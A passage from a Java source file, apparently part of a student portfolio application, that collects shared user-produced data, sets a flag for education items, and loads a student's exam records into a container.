				if (udList.contains(obj.getId())) {
					UserProducedData upd = PortfolioUtils.convert(obj.getContent(), UserProducedData.class);
					if (PortfolioManager.STUDENT_EDU_CATEGORY.equals(upd.getCategory())
							&& PortfolioManager.STUDENT_EDU_TYPE.equals(upd.getType())) {
						showExams = true;
					}
					upd.setId(obj.getId());
					updList.add(upd);
				}
			}
			// for (String s : udList) {
			// String updString = portfolioManager.getUserProducedData(s);
			// obj = new DomainObject(updString);
			// UserProducedData upd = PortfolioUtils.convert(obj.getContent(),
			// UserProducedData.class);
			// if
			// (PortfolioManager.STUDENT_EDU_CATEGORY.equals(upd.getCategory())
			// && PortfolioManager.STUDENT_EDU_TYPE.equals(upd.getType())) {
			// showExams = true;
			// }
			// upd.setId(obj.getId());
			// updList.add(upd);
			// }
		}
		container.setSharedProducedDatas(updList);

		if (showExams) {
			ArrayList<StudentExams> seList = new ArrayList<StudentExams>();
			String seString = portfolioManager.getStudentExams(p.getUserId());
			if (seString != null && !seString.isEmpty()) {
				obj = new DomainObject(seString);
				StudentExams se = PortfolioUtils.convert(obj.getContent(), StudentExams.class);
				se.setId(obj.getId());
				seList.add(se);
			}
			container.setSharedStudentExams(seList);
		}

		return container;
	}

}
